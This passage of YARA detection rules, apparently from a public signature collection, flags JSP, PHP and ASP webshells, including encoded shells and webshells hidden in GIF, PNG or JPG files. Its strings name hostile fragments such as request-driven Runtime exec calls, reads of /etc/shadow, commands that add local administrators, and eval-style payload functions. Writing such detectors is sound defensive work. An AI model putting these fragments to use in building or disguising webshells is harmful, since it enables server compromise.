		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		importance = 70

	strings:
		$exec = "extends ClassLoader" wide ascii
		$class = "defineClass" fullword wide ascii
		$cjsp_short1 = "<%" ascii wide
		$cjsp_short2 = "%>" wide ascii
		$cjsp_long1 = "<jsp:" ascii wide
		$cjsp_long2 = /language=[\"']java[\"\']/ ascii wide
		$cjsp_long3 = "/jstl/core" ascii wide
		$cjsp_long4 = "<%@p" nocase ascii wide
		$cjsp_long5 = "<%@ " nocase ascii wide
		$cjsp_long6 = "<% " ascii wide
		$cjsp_long7 = "< %" ascii wide
		$input1 = "getParameter" fullword ascii wide
		$input2 = "getHeaders" fullword ascii wide
		$input3 = "getInputStream" fullword ascii wide
		$input4 = "getReader" fullword ascii wide
		$req1 = "request" fullword ascii wide
		$req2 = "HttpServletRequest" fullword ascii wide
		$req3 = "getRequest" fullword ascii wide

	condition:
		(($cjsp_short1 at 0 or any of ($cjsp_long*) or $cjsp_short2 in ( filesize -100.. filesize ) or ($cjsp_short2 and ($cjsp_short1 in (0..1000) or $cjsp_short1 in ( filesize -1000.. filesize )))) and ( any of ($input*) and any of ($req*)) and $exec and $class) and ( filesize <10KB or ( filesize <50KB and (math.entropy(500, filesize -500)<=1 or math.entropy(500, filesize -500)>=7.7)))
}
rule SIGNATURE_BASE_WEBSHELL_JSP_Generic_Encoded_Shell : FILE {
    meta:
		description = "Generic JSP webshell which contains cmd or /bin/bash encoded in ascii ord"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "359949d7-1793-5e13-9fdc-fe995ae12117"
		date = "2021-01-07"
		modified = "2023-07-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_webshells.yar#L6145-L6171"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "3eecc354390d60878afaa67a20b0802ce5805f3a9bb34e74dd8c363e3ca0ea5c"
		hash = "f6c2112e3a25ec610b517ff481675b2ce893cb9f"
		hash = "62e6c6065b5ca45819c1fc049518c81d7d165744"
		logic_hash = "74f45478e5bd7bb300e4ec493c2d3ef9a26340a141c3512a722618b3a3731500"
		score = 75
		quality = 83
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		importance = 70

	strings:
		$sj0 = /\{ ?47, 98, 105, 110, 47, 98, 97, 115, 104/ wide ascii
		$sj1 = /\{ ?99, 109, 100}/ wide ascii
		$sj2 = /\{ ?99, 109, 100, 46, 101, 120, 101/ wide ascii
		$sj3 = /\{ ?47, 98, 105, 110, 47, 98, 97/ wide ascii
		$sj4 = /\{ ?106, 97, 118, 97, 46, 108, 97, 110/ wide ascii
		$sj5 = /\{ ?101, 120, 101, 99 }/ wide ascii
		$sj6 = /\{ ?103, 101, 116, 82, 117, 110/ wide ascii

	condition:
		filesize <300KB and any of ($sj*)
}
rule SIGNATURE_BASE_WEBSHELL_JSP_Netspy : FILE {
    meta:
		description = "JSP netspy webshell"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "41f5c171-878d-579f-811d-91d74f7e3e24"
		date = "2021-01-24"
		modified = "2023-04-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_webshells.yar#L6173-L6239"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "94d1aaabde8ff9b4b8f394dc68caebf981c86587"
		hash = "3870b31f26975a7cb424eab6521fc9bffc2af580"
		logic_hash = "1c0da3ee7a3cc8a1cf73dcd2648a1f6cb0bf3b32b37725d8d8f307e8fb7b7238"
		score = 75
		quality = 1
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		importance = 70

	strings:
		$scan1 = "scan" nocase wide ascii
		$scan2 = "port" nocase wide ascii
		$scan3 = "web" fullword nocase wide ascii
		$scan4 = "proxy" fullword nocase wide ascii
		$scan5 = "http" fullword nocase wide ascii
		$scan6 = "https" fullword nocase wide ascii
		$write1 = "os.write" fullword wide ascii
		$write2 = "FileOutputStream" fullword wide ascii
		$write3 = "PrintWriter" fullword wide ascii
		$http = "java.net.HttpURLConnection" fullword wide ascii
		$cjsp_short1 = "<%" ascii wide
		$cjsp_short2 = "%>" wide ascii
		$cjsp_long1 = "<jsp:" ascii wide
		$cjsp_long2 = /language=[\"']java[\"\']/ ascii wide
		$cjsp_long3 = "/jstl/core" ascii wide
		$cjsp_long4 = "<%@p" nocase ascii wide
		$cjsp_long5 = "<%@ " nocase ascii wide
		$cjsp_long6 = "<% " ascii wide
		$cjsp_long7 = "< %" ascii wide
		$input1 = "getParameter" fullword ascii wide
		$input2 = "getHeaders" fullword ascii wide
		$input3 = "getInputStream" fullword ascii wide
		$input4 = "getReader" fullword ascii wide
		$req1 = "request" fullword ascii wide
		$req2 = "HttpServletRequest" fullword ascii wide
		$req3 = "getRequest" fullword ascii wide

	condition:
		filesize <30KB and ($cjsp_short1 at 0 or any of ($cjsp_long*) or $cjsp_short2 in ( filesize -100.. filesize ) or ($cjsp_short2 and ($cjsp_short1 in (0..1000) or $cjsp_short1 in ( filesize -1000.. filesize )))) and ( any of ($input*) and any of ($req*)) and 4 of ($scan*) and 1 of ($write*) and $http
}
rule SIGNATURE_BASE_WEBSHELL_JSP_By_String : FILE {
    meta:
		description = "JSP Webshells which contain unique strings, lousy rule for low hanging fruits. Most are catched by other rules in here but maybe these catch different versions."
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "8d64e40b-5583-5887-afe1-b926d9880913"
		date = "2021-01-09"
		modified = "2023-04-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_webshells.yar#L6241-L6338"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "e9060aa2caf96be49e3b6f490d08b8a996c4b084"
		hash = "4c2464503237beba54f66f4a099e7e75028707aa"
		hash = "06b42d4707e7326aff402ecbb585884863c6351a"
		hash = "dada47c052ec7fcf11d5cfb25693bc300d3df87de182a254f9b66c7c2c63bf2e"
		hash = "f9f6c696c1f90df6421cd9878a1dec51a62e91b4b4f7eac4920399cb39bc3139"
		hash = "f1d8360dc92544cce301949e23aad6eb49049bacf9b7f54c24f89f7f02d214bb"
		hash = "1d1f26b1925a9d0caca3fdd8116629bbcf69f37f751a532b7096a1e37f4f0076"
		hash = "850f998753fde301d7c688b4eca784a045130039512cf51292fcb678187c560b"
		logic_hash = "e7db0c71f7c020da414dc453f6b8f95679a75232eeabb195f1a7c501c566dd04"
		score = 75
		quality = 19
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		importance = 70

	strings:
		$jstring1 = "<title>Boot Shell</title>" wide ascii
		$jstring2 = "String oraPWD=\"" wide ascii
		$jstring3 = "Owned by Chinese Hackers!" wide ascii
		$jstring4 = "AntSword JSP" wide ascii
		$jstring5 = "JSP Webshell</" wide ascii
		$jstring6 = "motoME722remind2012" wide ascii
		$jstring7 = "EC(getFromBase64(toStringHex(request.getParameter(\"password" wide ascii
		$jstring8 = "http://jmmm.com/web/index.jsp" wide ascii
		$jstring9 = "list.jsp = Directory & File View" wide ascii
		$jstring10 = "jdbcRowSet.setDataSourceName(request.getParameter(" wide ascii
		$jstring11 = "Mr.Un1k0d3r RingZer0 Team" wide ascii
		$jstring12 = "MiniWebCmdShell" fullword wide ascii
		$jstring13 = "pwnshell.jsp" fullword wide ascii
		$jstring14 = "session set &lt;key&gt; &lt;value&gt; [class]<br>" wide ascii
		$jstring15 = "Runtime.getRuntime().exec(request.getParameter(" nocase wide ascii
		$jstring16 = "GIF98a<%@page" wide ascii
		$jstring17 = "Tas9er" fullword wide ascii
		$jstring18 = "uu0028\\u" wide ascii
		$jstring19 = "uu0065\\u" wide ascii
		$jstring20 = "uu0073\\u" wide ascii
		$jstring21 = /\\uuu{0,50}00/ wide ascii
		$jstring22 = /[\w\.]\\u(FFFB|FEFF|FFF9|FFFA|200C|202E|202D)[\w\.]/ wide ascii
		$jstring23 = "\"e45e329feb5d925b\"" wide ascii
		$jstring24 = "u<![CDATA[n" wide ascii
		$cjsp_short1 = "<%" ascii wide
		$cjsp_short2 = "%>" wide ascii
		$cjsp_long1 = "<jsp:" ascii wide
		$cjsp_long2 = /language=[\"']java[\"\']/ ascii wide
		$cjsp_long3 = "/jstl/core" ascii wide
		$cjsp_long4 = "<%@p" nocase ascii wide
		$cjsp_long5 = "<%@ " nocase ascii wide
		$cjsp_long6 = "<% " ascii wide
		$cjsp_long7 = "< %" ascii wide
		$dex = { 64 65 ( 78 | 79 ) 0a 30 }
		$pack = { 50 41 43 4b 00 00 00 02 00 }

	condition:
		not ( uint16(0)==0x5a4d or $dex at 0 or $pack at 0 or uint16(0)==0x4b50) and (( filesize <100KB and ($cjsp_short1 at 0 or any of ($cjsp_long*) or $cjsp_short2 in ( filesize -100.. filesize ) or ($cjsp_short2 and ($cjsp_short1 in (0..1000) or $cjsp_short1 in ( filesize -1000.. filesize )))) and any of ($jstring*)) or ( filesize <500KB and (#jstring21>20 or $jstring18 or $jstring19 or $jstring20)))
}
rule SIGNATURE_BASE_WEBSHELL_JSP_Input_Upload_Write : FILE {
    meta:
		description = "JSP uploader which gets input, writes files and contains \"upload\""
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "bbf26edd-88b7-5ec5-a16e-d96a086dcd19"
		date = "2021-01-24"
		modified = "2023-04-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_webshells.yar#L6340-L6400"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "ef98ca135dfb9dcdd2f730b18e883adf50c4ab82"
		hash = "583231786bc1d0ecca7d8d2b083804736a3f0a32"
		hash = "19eca79163259d80375ebebbc440b9545163e6a3"
		logic_hash = "30574fa858e1946adc84d5611569fe8f69631539903e49746e415ed002b36e1f"
		score = 75
		quality = 46
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		importance = 70

	strings:
		$upload = "upload" nocase wide ascii
		$write1 = "os.write" fullword wide ascii
		$write2 = "FileOutputStream" fullword wide ascii
		$cjsp_short1 = "<%" ascii wide
		$cjsp_short2 = "%>" wide ascii
		$cjsp_long1 = "<jsp:" ascii wide
		$cjsp_long2 = /language=[\"']java[\"\']/ ascii wide
		$cjsp_long3 = "/jstl/core" ascii wide
		$cjsp_long4 = "<%@p" nocase ascii wide
		$cjsp_long5 = "<%@ " nocase ascii wide
		$cjsp_long6 = "<% " ascii wide
		$cjsp_long7 = "< %" ascii wide
		$input1 = "getParameter" fullword ascii wide
		$input2 = "getHeaders" fullword ascii wide
		$input3 = "getInputStream" fullword ascii wide
		$input4 = "getReader" fullword ascii wide
		$req1 = "request" fullword ascii wide
		$req2 = "HttpServletRequest" fullword ascii wide
		$req3 = "getRequest" fullword ascii wide

	condition:
		filesize <10KB and ($cjsp_short1 at 0 or any of ($cjsp_long*) or $cjsp_short2 in ( filesize -100.. filesize ) or ($cjsp_short2 and ($cjsp_short1 in (0..1000) or $cjsp_short1 in ( filesize -1000.. filesize )))) and ( any of ($input*) and any of ($req*)) and $upload and 1 of ($write*)
}
rule SIGNATURE_BASE_WEBSHELL_Generic_OS_Strings : FILE {
    meta:
		description = "typical webshell strings"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "ea85e415-4774-58ac-b063-0f5eb535ec49"
		date = "2021-01-12"
		modified = "2023-07-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_webshells.yar#L6402-L6571"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "d5bfe40283a28917fcda0cefd2af301f9a7ecdad"
		hash = "fd45a72bda0a38d5ad81371d68d206035cb71a14"
		hash = "b4544b119f919d8cbf40ca2c4a7ab5c1a4da73a3"
		hash = "569259aafe06ba3cef9e775ee6d142fed6edff5f"
		hash = "48909d9f4332840b4e04b86f9723d7427e33ac67"
		hash = "0353ae68b12b8f6b74794d3273967b530d0d526f"
		logic_hash = "174a7ee42008940eea6f09be9de0c1dca982f1ecf4533e290744a4955e8bdfbb"
		score = 50
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		importance = 70

	strings:
		$fp1 = "http://evil.com/" wide ascii
		$fp2 = "denormalize('/etc/shadow" wide ascii
		$fp3 = "vim.org>"
		$tagasp_short1 = /<%[^"]/ wide ascii
		$tagasp_short2 = "%>" wide ascii
		$tagasp_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
		$tagasp_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
		$tagasp_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
		$tagasp_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
		$tagasp_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
		$tagasp_long10 = "<%@ " wide ascii
		$tagasp_long11 = /<% \w/ nocase wide ascii
		$tagasp_long12 = "<%ex" nocase wide ascii
		$tagasp_long13 = "<%ev" nocase wide ascii
		$tagasp_long20 = /<(%|script|msxsl:script).{0,60}language="?(vb|jscript|c#)/ nocase wide ascii
		$tagasp_long32 = /<script\s{1,30}runat=/ wide ascii
		$tagasp_long33 = /<SCRIPT\s{1,30}RUNAT=/ wide ascii
		$php1 = "<?php"
		$php2 = "<?="
		$jsp1 = "=\"java." wide ascii
		$jsp2 = "=\"javax." wide ascii
		$jsp3 = "java.lang." wide ascii
		$jsp4 = "public" fullword wide ascii
		$jsp5 = "throws" fullword wide ascii
		$jsp6 = "getValue" fullword wide ascii
		$jsp7 = "getBytes" fullword wide ascii
		$perl1 = "PerlScript" fullword
		$php_short = "<?" wide ascii
		$no_xml1 = "<?xml version" nocase wide ascii
		$no_xml2 = "<?xml-stylesheet" nocase wide ascii
		$no_asp1 = "<%@LANGUAGE" nocase wide ascii
		$no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
		$no_pdf = "<?xpacket"
		$php_new1 = /<\?=[^?]/ wide ascii
		$php_new2 = "<?php" nocase wide ascii
		$php_new3 = "<script language=\"php" nocase wide ascii
		$cjsp_short1 = "<%" ascii wide
		$cjsp_short2 = "%>" wide ascii
		$cjsp_long1 = "<jsp:" ascii wide
		$cjsp_long2 = /language=[\"']java[\"\']/ ascii wide
		$cjsp_long3 = "/jstl/core" ascii wide
		$cjsp_long4 = "<%@p" nocase ascii wide
		$cjsp_long5 = "<%@ " nocase ascii wide
		$cjsp_long6 = "<% " ascii wide
		$cjsp_long7 = "< %" ascii wide
		$w1 = "net localgroup administrators" nocase wide ascii
		$w2 = "net user" nocase wide ascii
		$w3 = "/add" nocase wide ascii
		$l1 = "/etc/shadow" wide ascii
		$l2 = "/etc/ssh/sshd_config" wide ascii
		$take_two1 = "net user" nocase wide ascii
		$take_two2 = "/add" nocase wide ascii

	condition:
		filesize <70KB and ((( any of ($tagasp_long*) or any of ($tagasp_classid*) or ($tagasp_short1 and $tagasp_short2 in ( filesize -100.. filesize )) or ($tagasp_short2 and ($tagasp_short1 in (0..1000) or $tagasp_short1 in ( filesize -1000.. filesize )))) and not (( any of ($perl*) or $php1 at 0 or $php2 at 0) or ((#jsp1+#jsp2+#jsp3)>0 and (#jsp4+#jsp5+#jsp6+#jsp7)>0))) or ((($php_short in (0..100) or $php_short in ( filesize -1000.. filesize )) and not any of ($no_*)) or any of ($php_new*)) or ($cjsp_short1 at 0 or any of ($cjsp_long*) or $cjsp_short2 in ( filesize -100.. filesize ) or ($cjsp_short2 and ($cjsp_short1 in (0..1000) or $cjsp_short1 in ( filesize -1000.. filesize ))))) and ( filesize <300KB and not uint16(0)==0x5a4d and ( all of ($w*) or all of ($l*) or 2 of ($take_two*))) and not any of ($fp*)
}
rule SIGNATURE_BASE_WEBSHELL_In_Image : FILE {
    meta:
		description = "Webshell in GIF, PNG or JPG"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "b1185b69-9b08-5925-823a-829fee6fa4cf"
		date = "2021-02-27"
		modified = "2024-03-11"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_webshells.yar#L6573-L6833"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "d4fde4e691db3e70a6320e78657480e563a9f87935af873a99db72d6a9a83c78"
		hash = "84938133ee6e139a2816ab1afc1c83f27243c8ae76746ceb2e7f20649b5b16a4"
		hash = "52b918a64afc55d28cd491de451bb89c57bce424f8696d6a94ec31fb99b17c11"
		logic_hash = "e7e78107c661aa5124a37b8e492986e5a3da63c79c97c4dc3199e648a5aa4aa8"
		score = 55
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		importance = 70

	strings:
		$png = { 89 50 4E 47 }
		$jpg = { FF D8 FF E0 }
		$gif = "GIF8" wide ascii
		$gif2 = "gif89"
		$gif3 = "Gif89"
		$mdb = { 00 01 00 00 53 74 }
		$php_short = "<?" wide ascii
		$no_xml1 = "<?xml version" nocase wide ascii
		$no_xml2 = "<?xml-stylesheet" nocase wide ascii
		$no_asp1 = "<%@LANGUAGE" nocase wide ascii
		$no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
		$no_pdf = "<?xpacket"
		$php_new1 = /<\?=[^?]/ wide ascii
		$php_new2 = "<?php" nocase wide ascii
		$php_new3 = "<script language=\"php" nocase wide ascii
		$cpayload1 = /\beval[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$cpayload2 = /\bexec[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$cpayload3 = /\bshell_exec[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$cpayload4 = /\bpassthru[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$cpayload5 = /\bsystem[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$cpayload6 = /\bpopen[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$cpayload7 = /\bproc_open[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$cpayload8 = /\bpcntl_exec[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$cpayload9 = /\bassert[\n\t ]{0,500}\([^)0]/ nocase wide ascii
		$cpayload10 = /\bpreg_replace[\n\t ]{0,500}\([^\)]{1,100}\/[ismxADSUXju]{0,11}(e|\\x65)/ nocase wide ascii
		$cpayload12 = /\bmb_ereg_replace[\t ]{0,500}\([^\)]{1,100}'e'/ nocase wide ascii
		$cpayload13 = /\bmb_eregi_replace[\t ]{0,500}\([^\)]{1,100}'e'/ nocase wide ascii
		$cpayload20 = /\bcreate_function[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$cpayload21 = /\bReflectionFunction[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$cpayload22 = /fetchall\(PDO::FETCH_FUNC[\n\t ]{0,500}[,}\)]/ nocase wide ascii
		$m_cpayload_preg_filter1 = /\bpreg_filter[\n\t ]{0,500}(\([^\)]|\/\*)/ nocase wide ascii
		$m_cpayload_preg_filter2 = "'|.*|e'" nocase wide ascii
		$php_multi_write1 = "fopen(" wide ascii
		$php_multi_write2 = "fwrite(" wide ascii
		$php_write1 = "move_uploaded_file" fullword wide ascii
		$cjsp1 = "<%" ascii wide
		$cjsp2 = "<jsp:" ascii wide
		$cjsp3 = /language=[\"']java[\"\']/ ascii wide
		$cjsp4 = "/jstl/core" ascii wide
		$payload1 = "ProcessBuilder" fullword ascii wide
		$payload2 = "processCmd" fullword ascii wide
		$rt_payload1 = "Runtime" fullword ascii wide
		$rt_payload2 = "getRuntime" fullword ascii wide
		$rt_payload3 = "exec" fullword ascii wide
		$tagasp_short1 = /<%[^"]/ wide ascii
		$tagasp_short2 = "%>" wide ascii
		$tagasp_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
		$tagasp_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
		$tagasp_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
		$tagasp_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
		$tagasp_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
		$tagasp_long10 = "<%@ " wide ascii
		$tagasp_long11 = /<% \w/ nocase wide ascii
		$tagasp_long12 = "<%ex" nocase wide ascii
		$tagasp_long13 = "<%ev" nocase wide ascii
		$tagasp_long20 = /<(%|script|msxsl:script).{0,60}language="?(vb|jscript|c#)/ nocase wide ascii
		$tagasp_long32 = /<script\s{1,30}runat=/ wide ascii
		$tagasp_long33 = /<SCRIPT\s{1,30}RUNAT=/ wide ascii
		$php1 = "<?php"
		$php2 = "<?="
		$jsp1 = "=\"java." wide ascii
		$jsp2 = "=\"javax." wide ascii
		$jsp3 = "java.lang." wide ascii
		$jsp4 = "public" fullword wide ascii
		$jsp5 = "throws" fullword wide ascii
		$jsp6 = "getValue" fullword wide ascii
		$jsp7 = "getBytes" fullword wide ascii
		$perl1 = "PerlScript" fullword
		$asp_payload0 = "eval_r" fullword nocase wide ascii
		$asp_payload1 = /\beval\s/ nocase wide ascii
		$asp_payload2 = /\beval\(/ nocase wide ascii
		$asp_payload3 = /\beval\"\"/ nocase wide ascii
		$asp_payload4 = /:\s{0,10}eval\b/ nocase wide ascii
		$asp_payload8 = /\bexecute\s?\(/ nocase wide ascii
		$asp_payload9 = /\bexecute\s[\w"]/ nocase wide ascii
		$asp_payload11 = "WSCRIPT.SHELL" fullword nocase wide ascii
		$asp_payload13 = "ExecuteGlobal" fullword nocase wide ascii
		$asp_payload14 = "ExecuteStatement" fullword nocase wide ascii
		$asp_payload15 = "ExecuteStatement" fullword nocase wide ascii
		$asp_multi_payload_one1 = "CreateObject" nocase fullword wide ascii
		$asp_multi_payload_one2 = "addcode" fullword wide ascii
		$asp_multi_payload_one3 = /\.run\b/ wide ascii
		$asp_multi_payload_two1 = "CreateInstanceFromVirtualPath" fullword wide ascii
		$asp_multi_payload_two2 = "ProcessRequest" fullword wide ascii
		$asp_multi_payload_two3 = "BuildManager" fullword wide ascii
		$asp_multi_payload_three1 = "System.Diagnostics" wide ascii
		$asp_multi_payload_three2 = "Process" fullword wide ascii
		$asp_multi_payload_three3 = ".Start" wide ascii
		$asp_multi_payload_four1 = "CreateObject" fullword nocase wide ascii
		$asp_multi_payload_four2 = "TransformNode" fullword nocase wide ascii
		$asp_multi_payload_four3 = "loadxml" fullword nocase wide ascii
		$asp_multi_payload_five1 = "ProcessStartInfo" fullword nocase wide ascii
		$asp_multi_payload_five2 = ".Start" nocase wide ascii
		$asp_multi_payload_five3 = ".Filename" nocase wide ascii
		$asp_multi_payload_five4 = ".Arguments" nocase wide ascii
		$asp_always_write1 = /\.write/ nocase wide ascii
		$asp_always_write2 = /\.swrite/ nocase wide ascii
		$asp_write_way_one2 = "SaveToFile" fullword nocase wide ascii
		$asp_write_way_one3 = "CREAtEtExtFiLE" fullword nocase wide ascii
		$asp_cr_write1 = "CreateObject(" nocase wide ascii
		$asp_cr_write2 = "CreateObject (" nocase wide ascii
		$asp_streamwriter1 = "streamwriter" fullword nocase wide ascii
		$asp_streamwriter2 = "filestream" fullword nocase wide ascii

	condition:
		filesize <5MB and ($png at 0 or $jpg at 0 or $gif at 0 or $gif at 3 or $gif2 at 0 or $gif2 at 3 or $gif3 at 0 or $mdb at 0) and ((((($php_short in (0..100) or $php_short in ( filesize -1000.. filesize )) and not any of ($no_*)) or any of ($php_new*)) and (( any of ($cpayload*) or all of ($m_cpayload_preg_filter*)) or ( any of ($php_write*) or all of ($php_multi_write*)))) or (( any of ($cjsp*)) and (1 of ($payload*) or all of ($rt_payload*))) or ((( any of ($tagasp_long*) or any of ($tagasp_classid*) or ($tagasp_short1 and $tagasp_short2 in ( filesize -100.. filesize )) or ($tagasp_short2 and ($tagasp_short1 in (0..1000) or $tagasp_short1 in ( filesize -1000.. filesize )))) and not (( any of ($perl*) or $php1 at 0 or $php2 at 0) or ((#jsp1+#jsp2+#jsp3)>0 and (#jsp4+#jsp5+#jsp6+#jsp7)>0))) and (( any of ($asp_payload*) or all of ($asp_multi_payload_one*) or all of ($asp_multi_payload_two*) or all of ($asp_multi_payload_three*) or all of ($asp_multi_payload_four*) or all of ($asp_multi_payload_five*)) or ( any of ($asp_always_write*) and ( any of ($asp_write_way_one*) and any of ($asp_cr_write*)) or ( any of ($asp_streamwriter*))))))
}
rule SIGNATURE_BASE_WEBSHELL_Mixed_OBFUSC : FILE {
    meta:
		description = "Detects webshell with mixed obfuscation commands"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "dcb4054b-0c87-5cd0-9297-7fd5f2e37437"
		date = "2023-01-28"
		modified = "2023-04-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_webshells.yar#L6835-L6859"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "76cc6390cbdb81055c72edb124db2bf52e3d0b975406367a9c49a0ee6621d30b"
		score = 50
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "8c4e5c6bdfcc86fa27bdfb075a7c9a769423ec6d53b73c80cbc71a6f8dd5aace"
		hash2 = "78f2086b6308315f5f0795aeaa75544128f14889a794205f5fc97d7ca639335b"
		hash3 = "3bca764d44074820618e1c831449168f220121698a7c82e9909f8eab2e297cbd"
		hash4 = "b26b5e5cba45482f486ff7c75b54c90b7d1957fd8e272ddb4b2488ec65a2936e"
		hash5 = "e217be2c533bfddbbdb6dc6a628e0d8756a217c3ddc083894e07fd3a7408756c"
		importance = 70

	strings:
		$s1 = "rawurldecode/*" ascii
		$s2 = "preg_replace/*" ascii
		$s3 = " __FILE__/*" ascii
		$s4 = "strlen/*" ascii
		$s5 = "str_repeat/*" ascii
		$s6 = "basename/*" ascii

	condition:
		( uint16(0)==0x3f3c and filesize <200KB and (4 of them ))
}
rule SIGNATURE_BASE_WEBSHELL_Cookie_Post_Obfuscation : FILE {
    meta:
		description = "Detects webshell using cookie POST"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "cc5ded80-5e58-5b25-86d1-1c492042c740"
		date = "2023-01-28"
		modified = "2023-04-05"
		reference = "https://github.com/SigmaHQ/Detection-Rule-License/blob/main/LICENSE.Detection.Rules.md"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_webshells.yar#L6861-L6887"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "d08a00e56feb78b7f6599bad6b9b1d8626ce9a6ea1dfdc038358f4c74e6f65c9"
		hash = "2ce5c4d31682a5a59b665905a6f698c280451117e4aa3aee11523472688edb31"
		hash = "ff732d91a93dfd1612aed24bbb4d13edb0ab224d874f622943aaeeed4356c662"
		hash = "a3b64e9e065602d2863fcab641c75f5d8ec67c8632db0f78ca33ded0f4cea257"
		hash = "d41abce305b0dc9bd3a9feb0b6b35e8e39db9e75efb055d0b1205a9f0c89128e"
		hash = "333560bdc876fb0186fae97a58c27dd68123be875d510f46098fc5a61615f124"
		hash = "2efdb79cdde9396ff3dd567db8876607577718db692adf641f595626ef64d3a4"
		hash = "e1bd3be0cf525a0d61bf8c18e3ffaf3330c1c27c861aede486fd0f1b6930f69a"
		hash = "f8cdedd21b2cc29497896ec5b6e5863cd67cc1a798d929fd32cdbb654a69168a"
		logic_hash = "87229859ca3ee8f8b79360603c421528cda2ecefcc46d4080236d09b2dd510fb"
		score = 75
		quality = 85
		tags = "FILE"
		importance = 70

	strings:
		$s1 = "]($_COOKIE, $_POST) as $"
		$s2 = "function"
		$s3 = "Array"

	condition:
		( uint16(0)==0x3f3c and filesize <100KB and ( all of them ))
}
rule SIGNATURE_BASE_Gifcloaked_Webshell_A : FILE {
    meta:
		description = "Looks like a webshell cloaked as GIF"
		author = "Florian Roth (Nextron Systems)"
		id = "4fdef65c-204a-5019-9b4f-c5877c3e39d4"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/yara_mixed_ext_vars.yar#L180-L201"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
